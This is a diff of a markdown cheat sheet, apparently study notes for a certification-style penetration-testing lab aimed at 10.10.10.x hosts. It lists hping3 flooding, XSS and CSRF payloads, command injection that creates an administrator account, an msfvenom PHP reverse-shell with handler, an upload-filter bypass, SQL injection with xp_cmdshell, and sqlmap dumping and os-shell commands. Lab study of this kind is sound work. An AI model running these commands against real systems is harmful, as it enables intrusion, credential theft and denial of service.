@@ -16,7 +16,6 @@
 - Hydra - https://tryhackme.com/room/hydra
 - CrackTheHash - https://tryhackme.com/room/crackthehash
 
-
 ##### Discovery
 * netdiscover -i eth0
 * fping -a -g subnet 2>/dev/null
@@ -138,7 +137,7 @@
     
 ##### Module 10 - Denial of Service
     
-*  wireshark - tcp filter
+* wireshark - tcp filter
 * hping3 -S 10.10.10.10 -a 10.10.10.11 -p 22 --flood
 * HOIC (high orbit Ion Cannon)
     
@@ -165,13 +164,11 @@
     
 ###### parameter  tampering
 * When logged into site with user the following url will show in the address bar 
- * http://10.10.10.12/viewprofile.aspx?id=2 change it to http://10.10.10.12/viewprofile.aspx?id=1
+* http://10.10.10.12/viewprofile.aspx?id=2 change it to http://10.10.10.12/viewprofile.aspx?id=1
     
 ###### Cross Site Scripting (XSS or CSS)
 * <script>alert("XSS Alert")</script>
-    
 * wpscan --url 10.10.10.12 --enumerate u
-    
 * msfconsole
  * use/auxiliary/scanner/http/wordpress_login_enum
  * set PASS_FILE passwords.txt
@@ -180,18 +177,14 @@
  * set TARGETURI http://10.10.10.12/wordpress
  * set USERNAME admin
  * run
-     
 * DVWA (damn vulnerable web app)
-   
 ###### command injection
 * ping | hostname
 * ping | net user
 * ping | net user TestUser /add
 * ping | net localgroup Administrators TestUser /add
-    
 * Vega
 * Acunetix
-    
 * msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.11 lport=4444 -f raw > shell.php
 * msfconsole
  * use/multi/handler
@@ -201,23 +194,19 @@
 * run
 when shell connects
 * sysinfo
-    
-if .php doesn't upload and says only images like .jpg, .jpeg, .png only allowed rename shell.php to shell.php.jpg
+* if .php doesn't upload and says only images like .jpg, .jpeg, .png only allowed rename shell.php to shell.php.jpg
 if that doesn't work, rename to shell.php
 edit in notepad or vim and add GIF98 in the beginning
-   
-burpsuite
+* burpsuite
    
 ###### Upload CSRF
     
 * wpscan -u http://10.10.10.12 --enumerate vp
-   
 * <form  method="POST" action="https://10.10.10.12/wp-admin/options-general.php?page=wordpress-firewall-2%2Fwordpress-firewall-2.php"><script>alert("As an Admin, To Enable additional security to your website. Click Submimt")</script><input type="hidden" name="whitelisted_ip[]" value="10.10.10.11">
 <input type="hidden" name="set_whitelist_ip" value="Set Whitelist IPs" class="button-secondary">
 <input type="submit">
 </form>
 *  save as Security_Script.html
-    
     
 ##### Module 15 - SQL Injection
     
@@ -225,20 +214,16 @@ burpsuite
 * blah';insert into login values('jon','pass'); --
 * blah';create database newdb; --
 * blah';'exec master_xp_cmdshell 'ping 10.10.10.12 -l 65000 -t; --
-    
 * NStalker
-    
 * inspect element
-* console
-* document.cookie
-           
+ * console
+ * document.cookie
 * sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> --dbs
 * sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> -D dbname --tables
 * sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> -D dbname -T user_login_table --columns
 * sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> -D dbname -T user_login_table --dump
 * sqlmap -u "10.10.10.12/viewprofile.aspx?id=1" --cookies=<"cookie value which you have copied above"> --os-shell
-    
-    
+     
 ##### Module 20 - Cryptography
     
 * HashCalc
